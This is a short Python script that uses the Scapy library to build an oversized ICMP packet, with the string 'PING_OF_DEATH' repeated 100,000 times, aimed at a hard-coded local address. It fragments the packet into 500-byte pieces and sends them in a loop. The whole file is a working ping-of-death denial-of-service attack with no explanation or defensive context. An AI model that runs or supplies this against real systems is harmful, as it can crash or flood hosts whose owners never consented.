from scapy.all import *
targetIP="192.168.0.186"

iphead = IP(dst=targetIP)
packet = iphead/ICMP()/("PING_OF_DEATH"*100000)

_all_fragments=fragment(packet,fragsize=500)
i = 1
for frag in _all_fragments:
  print("Packet Number " + str(i))
  send(frag)
  i = i + 1
  print("---Packet Sent----")
